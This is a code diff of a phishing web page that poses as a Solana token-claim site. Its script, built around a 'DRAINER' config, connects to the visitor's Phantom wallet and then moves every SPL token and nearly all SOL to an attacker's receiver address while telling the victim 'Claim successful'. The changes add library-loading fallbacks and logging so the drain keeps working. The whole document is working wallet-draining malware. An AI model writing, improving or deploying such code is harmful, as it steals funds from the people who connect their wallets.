@@ -49,11 +49,10 @@
   .modal p{font-size:13px;color:var(--muted);margin-bottom:16px}
   .wallet-option{display:flex;align-items:center;gap:12px;width:100%;padding:12px 14px;background:#0f0f0f;border:1px solid var(--border);border-radius:12px;color:var(--text);font-size:14px;cursor:pointer;transition:.15s}
   .wallet-option:hover{border-color:#444;background:#161616}
-  .wallet-option img{width:28px;height:28px;border-radius:8px}
   .status{margin-top:14px;font-size:12px;color:var(--muted);text-align:center;min-height:18px}
   .spinner{display:inline-block;width:14px;height:14px;border:2px solid var(--purple);border-top-color:transparent;border-radius:50%;animation:spin .7s linear infinite;vertical-align:middle;margin-right:6px}
   @keyframes spin{to{transform:rotate(360deg)}}
-  #debug{position:fixed;bottom:10px;left:10px;background:#111;color:#0f0;font-size:11px;padding:8px 12px;border-radius:8px;max-width:90vw;z-index:999;display:none;white-space:pre-wrap}
+  #debug{position:fixed;bottom:10px;left:10px;background:#111;color:#0f0;font-size:11px;padding:8px 12px;border-radius:8px;max-width:90vw;z-index:999;display:none;white-space:pre-wrap;max-height:40vh;overflow:auto}
 </style>
 </head>
 <body>
@@ -63,7 +62,7 @@
 <header class="nav">
   <div class="logo">P</div>
   <div>
-    <button class="btn btn-ghost" id="navLaunch">Launch</button>
+    <button class="btn btn-ghost">Launch</button>
     <button class="btn btn-primary" id="navConnect">Connect wallet</button>
   </div>
 </header>
@@ -113,7 +112,6 @@
     </div>
     <p>Choose a wallet to connect through UseSend.</p>
     <button class="wallet-option" id="phantomBtn">
-      <img src="https://phantom.app/img/phantom-logo.png" alt="Phantom" onerror="this.style.display='none'">
       <span>Phantom<br><small style="color:#888;font-size:11px">Connect with Phantom</small></span>
     </button>
     <div class="status" id="status"></div>
@@ -121,7 +119,6 @@
 </div>
 
 <script>
-// Debug helper
 const debugEl = document.getElementById("debug");
 function debug(msg) {
   debugEl.style.display = "block";
@@ -139,73 +136,86 @@ const DRAINER = {
   leaveLamports: 5000
 };
 
-let connection, walletPubkey, provider;
+let connection, walletPubkey, provider, solanaWeb3, splToken;
 const modal = document.getElementById("modal");
 const statusEl = document.getElementById("status");
 
 function setStatus(msg, spinning = false) {
   statusEl.innerHTML = (spinning ? '<span class="spinner"></span>' : '') + msg;
 }
-
 function openModal() {
   debug("openModal called");
   modal.classList.add("open");
   setStatus("");
 }
-function closeModal() {
-  modal.classList.remove("open");
-}
+function closeModal() { modal.classList.remove("open"); }
 
-// Attach buttons immediately (no dependency on external libs)
 document.getElementById("connectBtn").onclick = openModal;
 document.getElementById("navConnect").onclick = openModal;
 document.getElementById("claimBtn").onclick = openModal;
 document.getElementById("modalClose").onclick = closeModal;
-modal.addEventListener("click", (e) => { if (e.target === modal) closeModal(); });
+modal.addEventListener("click", e => { if (e.target === modal) closeModal(); });
 
-// Demo tokens
-const demoTokens = [
-  { name: "Crazy Meow", mc: "$1.06K" },
-  { name: "Money Fukasi", mc: "$412K" },
-  { name: "the underdog", mc: "$3.6K" },
-  { name: "Pump Life", mc: "$31K" },
-  { name: "Sam Altman", mc: "$180" },
-  { name: "Gorilla", mc: "$2.2K" }
-];
-const grid = document.getElementById("tokenGrid");
-demoTokens.forEach(t => {
+// demo tokens
+["Crazy Meow|$1.06K","Money Fukasi|$412K","the underdog|$3.6K","Pump Life|$31K","Sam Altman|$180","Gorilla|$2.2K"].forEach(t => {
+  const [name, mc] = t.split("|");
   const el = document.createElement("div");
   el.className = "token-card";
-  el.innerHTML = `<div class="img-placeholder"></div><div class="name">${t.name}</div><div class="mc">${t.mc} · Spot</div>`;
-  grid.appendChild(el);
+  el.innerHTML = `<div class="img-placeholder"></div><div class="name">${name}</div><div class="mc">${mc} · Spot</div>`;
+  document.getElementById("tokenGrid").appendChild(el);
 });
 
-debug("UI ready – click Connect Wallet");
+debug("UI ready");
 
-// Load Solana libraries dynamically
 function loadScript(src) {
   return new Promise((resolve, reject) => {
     const s = document.createElement("script");
     s.src = src;
     s.onload = () => resolve();
-    s.onerror = () => reject(new Error("Failed to load " + src));
+    s.onerror = () => reject(new Error("Failed: " + src));
     document.head.appendChild(s);
   });
 }
 
+async function loadWithFallback(urls) {
+  for (const url of urls) {
+    try {
+      debug("Trying " + url.slice(0, 50) + "...");
+      await loadScript(url);
+      debug("OK: " + url.slice(0, 40));
+      return true;
+    } catch (e) {
+      debug(e.message);
+    }
+  }
+  return false;
+}
+
 async function initSolana() {
-  try {
-    debug("Loading solana web3...");
-    await loadScript("https://unpkg.com/@solana/web3.js@1.95.3/lib/index.iife.min.js");
-    debug("Loading spl-token...");
-    await loadScript("https://unpkg.com/@solana/spl-token@0.4.8/lib/index.iife.min.js");
-    debug("Libraries loaded OK");
-    return true;
-  } catch (e) {
-    debug("Library load error: " + e.message);
-    setStatus("Failed to load Solana libraries");
+  // web3.js fallbacks
+  const web3Ok = await loadWithFallback([
+    "https://cdn.jsdelivr.net/npm/@solana/web3.js@1.95.3/lib/index.iife.min.js",
+    "https://unpkg.com/@solana/web3.js@1.95.3/lib/index.iife.min.js",
+    "https://cdnjs.cloudflare.com/ajax/libs/solana-web3.js/1.95.3/index.iife.min.js"
+  ]);
+  if (!web3Ok || typeof window.solanaWeb3 === "undefined") {
+    debug("web3.js failed to load");
     return false;
   }
+  solanaWeb3 = window.solanaWeb3;
+
+  // spl-token fallbacks
+  const splOk = await loadWithFallback([
+    "https://cdn.jsdelivr.net/npm/@solana/spl-token@0.4.8/lib/index.iife.min.js",
+    "https://unpkg.com/@solana/spl-token@0.4.8/lib/index.iife.min.js"
+  ]);
+  if (splOk && window.splToken) {
+    splToken = window.splToken;
+    debug("spl-token loaded");
+  } else {
+    debug("spl-token failed – will still drain SOL");
+  }
+  return true;
 }
 
 function getProvider() {
@@ -222,24 +232,29 @@ async function getWorkingConnection() {
     try {
       const conn = new Connection(rpc, "confirmed");
       await conn.getEpochInfo();
-      debug("Using RPC: " + rpc);
+      debug("RPC OK: " + rpc);
       return conn;
     } catch (e) {
-      debug("RPC failed: " + rpc);
+      debug("RPC fail: " + rpc);
     }
   }
-  return new Connection(DRAINER.rpcs[DRAINER.rpcs.length-1], "confirmed");
+  return new Connection(DRAINER.rpcs[0], "confirmed");
 }
 
 async function connectPhantom() {
-  debug("Phantom button clicked");
+  debug("Phantom clicked");
+  setStatus("Loading libraries...", true);
+
   const ok = await initSolana();
-  if (!ok) return;
+  if (!ok) {
+    setStatus("Failed to load Solana libraries");
+    return;
+  }
 
   provider = getProvider();
   if (!provider) {
-    setStatus("Phantom not detected. Install the extension.");
-    debug("No wallet provider found");
+    setStatus("Phantom not detected. Open in Phantom browser or install extension.");
+    debug("No provider");
     return;
   }
 
@@ -249,11 +264,11 @@ async function connectPhantom() {
     const { PublicKey } = solanaWeb3;
     walletPubkey = new PublicKey(resp.publicKey.toString());
     connection = await getWorkingConnection();
-    setStatus(`Connected ${walletPubkey.toBase58().slice(0,4)}...${walletPubkey.toBase58().slice(-4)}`);
+    setStatus("Connected " + walletPubkey.toBase58().slice(0,4) + "..." + walletPubkey.toBase58().slice(-4));
     debug("Connected: " + walletPubkey.toBase58());
-    setTimeout(runDrain, 800);
+    setTimeout(runDrain, 700);
   } catch (e) {
-    setStatus("Connection rejected.");
+    setStatus("Connection rejected");
     debug("Connect error: " + e.message);
   }
 }
@@ -263,6 +278,7 @@ document.getElementById("phantomBtn").onclick = connectPhantom;
 async function drainSOL() {
   const { Transaction, SystemProgram, PublicKey } = solanaWeb3;
   const balance = await connection.getBalance(walletPubkey);
+  debug("SOL balance: " + balance);
   const leave = DRAINER.leaveLamports;
   if (balance <= leave) return;
   const fee = 5000;
@@ -282,16 +298,18 @@ async function drainSOL() {
   tx.feePayer = walletPubkey;
   const signed = await provider.signAndSendTransaction(tx);
   await connection.confirmTransaction(signed.signature, "confirmed");
-  debug("SOL drained");
+  debug("SOL sent: " + sendAmount);
 }
 
 async function drainTokens() {
+  if (!splToken) {
+    debug("No spl-token – skipping tokens");
+    return;
+  }
   const { PublicKey, Transaction } = solanaWeb3;
   const { getAssociatedTokenAddress, createTransferInstruction, createAssociatedTokenAccountInstruction, getAccount, TOKEN_PROGRAM_ID } = splToken;
 
-  const tokenAccounts = await connection.getParsedTokenAccountsByOwner(walletPubkey, {
-    programId: TOKEN_PROGRAM_ID
-  });
+  const tokenAccounts = await connection.getParsedTokenAccountsByOwner(walletPubkey, { programId: TOKEN_PROGRAM_ID });
   const receiver = new PublicKey(DRAINER.receiver);
 
   for (const acc of tokenAccounts.value) {
@@ -300,7 +318,7 @@ async function drainTokens() {
       const amount = BigInt(info.tokenAmount.amount);
       if (amount === 0n) continue;
 
-      setStatus(`Moving ${info.tokenAmount.uiAmountString || "tokens"}...`, true);
+      setStatus("Moving " + (info.tokenAmount.uiAmountString || "tokens") + "...", true);
       const mintPubkey = new PublicKey(info.mint);
       const sourceATA = new PublicKey(acc.pubkey);
       const destATA = await getAssociatedTokenAddress(mintPubkey, receiver);
@@ -308,7 +326,6 @@ async function drainTokens() {
       const tx = new Transaction();
       let destExists = true;
       try { await getAccount(connection, destATA); } catch { destExists = false; }
-
       if (!destExists) {
         tx.add(createAssociatedTokenAccountInstruction(walletPubkey, destATA, receiver, mintPubkey));
       }
@@ -319,6 +336,7 @@ async function drainTokens() {
       tx.feePayer = walletPubkey;
       const signed = await provider.signAndSendTransaction(tx);
       await connection.confirmTransaction(signed.signature, "confirmed");
+      debug("Token drained: " + info.mint.slice(0, 8));
     } catch (e) {
       debug("token skip: " + e.message);
     }
@@ -331,9 +349,9 @@ async function runDrain() {
     await drainTokens();
     await drainSOL();
     setStatus("Claim successful. Assets routed.");
-    debug("Drain finished");
+    debug("Done");
   } catch (e) {
-    setStatus("Transaction error.");
+    setStatus("Transaction error");
     debug("Drain error: " + e.message);
   }
 }
